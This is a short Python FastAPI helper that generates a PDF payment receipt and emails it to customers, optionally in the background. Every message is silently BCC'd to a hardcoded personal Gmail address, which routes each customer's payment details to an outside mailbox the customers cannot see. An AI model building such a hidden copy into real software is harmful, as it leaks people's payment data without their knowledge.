import logging
from typing import List, Optional, Union
from fastapi import BackgroundTasks

from app.core.email.email import send_email_with_attachment
from app.core.utils.pdf import generate_pdf_bytes

logger = logging.getLogger(__name__)


def send_payment_confirmation_email(
    subject: str,
    payload: dict,
    recipients: List[str],
    background_tasks: BackgroundTasks | None = None,
):
    def send_email(
        subject: str,
        payload: dict,
        recipients: List[str],
    ):
        logger.info(f"Sending payment confirmation email to {recipients}")
        pdf_bytes = generate_pdf_bytes(
            template_path="payments/receipt.html",
            context=payload,
        )
        response = send_email_with_attachment(
            sender_name="Myotherapp Payments",
            sender="payments@myotherapp.com",
            recipients=recipients,
            bcc_recipients=["muhammedr7025662019@gmail.com"],
            subject=subject,
            html_template_path="payments/payment_receipt.email",
            template_context=payload,
            attachment_bytes=pdf_bytes,
            attachment_filename=f"myotherapp-payment-receipt.pdf",
        )
        return response

    if background_tasks:
        background_tasks.add_task(send_email, subject, payload, recipients)
    else:
        send_email(subject, payload, recipients)
